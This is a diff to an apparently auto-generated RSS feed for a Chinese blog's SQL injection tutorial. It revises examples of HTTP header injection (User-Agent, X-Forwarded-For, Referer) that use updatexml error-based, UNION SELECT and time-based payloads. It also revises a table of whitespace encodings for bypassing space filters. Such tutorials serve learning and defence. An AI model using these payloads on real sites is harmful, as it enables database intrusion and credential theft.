@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Example Person</copyright>
-        <lastBuildDate>Thu, 10 Jul 2025 14:21:55 +0800</lastBuildDate><atom:link href="https://blog.928330.xyz/tags/sql/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 21 Jul 2025 13:15:36 +0800</lastBuildDate><atom:link href="https://blog.928330.xyz/tags/sql/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>SQL注入：从入门到入土</title>
         <link>https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</link>
         <pubDate>Wed, 02 Jul 2025 00:52:02 +0800</pubDate>
@@ -989,10 +989,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;/analytics.php&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1.1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; vulnerable-site.com
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; Mozilla/5.0&amp;#39; AND (updatexml(1,concat(0x7e,(select database())),1))#
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;X-Forwarded-For&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; 127.0.0.1&amp;#39; UNION SELECT 1,user,password FROM users#
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Referer&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; http://google.com&amp;#39; AND IF(ascii(substring(database(),1,1))&amp;gt;100, sleep(5), 0)#
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方式和普通注入都是差不多的，核心思想没变&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; Mozilla/5.0&amp;#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;X-Forwarded-For&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; 127.0.0.1&amp;#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Referer&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; http://google.com&amp;#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方式和普通注入都是差不多的，核心思想没变，&lt;strong&gt;只是注意最好使用&lt;code&gt;&#39;&#39;&lt;/code&gt;闭合后半部分&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;cookie注入&#34;&gt;cookie注入
 &lt;/h3&gt;&lt;p&gt;从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的&lt;/strong&gt;&lt;/p&gt;
@@ -1100,24 +1100,48 @@
 &lt;h3 id=&#34;url编码绕过&#34;&gt;url编码绕过
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一般来说，我们会使用&lt;code&gt;+&lt;/code&gt;代替空格，因为&lt;code&gt;+&lt;/code&gt;是空格的一种url标准编码形式，如果不行，就要另寻他法了&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;普通空格 (Space, &lt;code&gt;%20&lt;/code&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;制表符 (Tab, &lt;code&gt;%09&lt;/code&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;换行符 (Newline, &lt;code&gt;%0a&lt;/code&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;回车符 (Carriage Return, &lt;code&gt;%0d&lt;/code&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;符号&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%20&lt;/td&gt;
+          &lt;td&gt;普通空格&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%09&lt;/td&gt;
+          &lt;td&gt;TAB 键(水平)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%0a&lt;/td&gt;
+          &lt;td&gt;新建一行&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%0c&lt;/td&gt;
+          &lt;td&gt;新的一页&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%0d&lt;/td&gt;
+          &lt;td&gt;return 功能&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%0b&lt;/td&gt;
+          &lt;td&gt;TAB 键(垂直)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;%a0&lt;/td&gt;
+          &lt;td&gt;空格（和普通空格不一样）&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 &lt;p&gt;虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用&lt;/p&gt;
 &lt;p&gt;制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39;%0dunion%0dselect%0d1,database()#
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;括号绕过&#34;&gt;括号绕过
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;%0dunion%0dselect%0d1,database()#
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;括号绕过&#34;&gt;括号绕过
 &lt;/h3&gt;&lt;h4 id=&#34;数字型&#34;&gt;数字型
 &lt;/h4&gt;&lt;p&gt;mysql数据库有这样一个特性：&lt;/p&gt;
 &lt;ul&gt;
